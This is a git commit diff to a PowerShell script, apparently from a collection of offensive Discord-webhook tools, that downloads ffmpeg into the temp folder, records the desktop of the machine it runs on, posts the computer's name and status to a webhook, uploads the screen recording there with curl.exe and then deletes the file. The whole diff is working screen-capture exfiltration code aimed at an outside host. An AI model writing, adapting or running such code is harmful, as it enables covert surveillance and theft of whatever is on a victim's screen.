42325dae42021dde9d32d609da9d2479c85f0ba8
egieb <93350544+beigeworm@users.noreply.github.com>
2024-04-11 15:28:42 +0000

    Update Record-Screen-to-Discord.ps1

--- Discord Scripts/Record-Screen-to-Discord.ps1
+++ Discord Scripts/Record-Screen-to-Discord.ps1
@@ -17,13 +17,11 @@ if ($hookurl.Ln -ne 121){$hookurl = (irm $hookurl).url}
 
 Function RecordScreen{
     param ([int[]]$t)
-    
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
-    
+    if ($t.Length -eq 0){$t = 10}
     $Path = "$env:Temp\ffmpeg.exe"
-    
     If (!(Test-Path $Path)){  
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":hourglass: ``Downloading ffmpeg.exe. Please wait...`` :hourglass:"} | ConvertTo-Json
+    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
         $zipUrl = 'https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-7.0-essentials_build.zip'
         $tempDir = "$env:temp"
         $zipFilePath = Join-Path $tempDir 'ffmpeg-7.0-essentials_build.zip'
@@ -34,18 +32,14 @@ Function RecordScreen{
         Remove-Item -Path $zipFilePath -Force
         Remove-Item -Path $extractedDir -Recurse -Force
     }
-    
-    sleep 1
     $mkvPath = "$env:Temp\ScreenClip.mkv"
-    
-    if ($t.Length -eq 0){$t = 10}
-    
-    .$env:Temp\ffmpeg.exe -f gdigrab -t $t -framerate 10 -i desktop $mkvPath
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen (24mb Clip)`` :arrows_counterclockwise:"} | ConvertTo-Json
+    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    .$env:Temp\ffmpeg.exe -f gdigrab -framerate 5 -i desktop -fs 24000000 $mkvPath
     curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
     sleep 1
     rm -Path $mkvPath -Force
-
 }
 
-RecordScreen -t 30
+RecordScreen
 
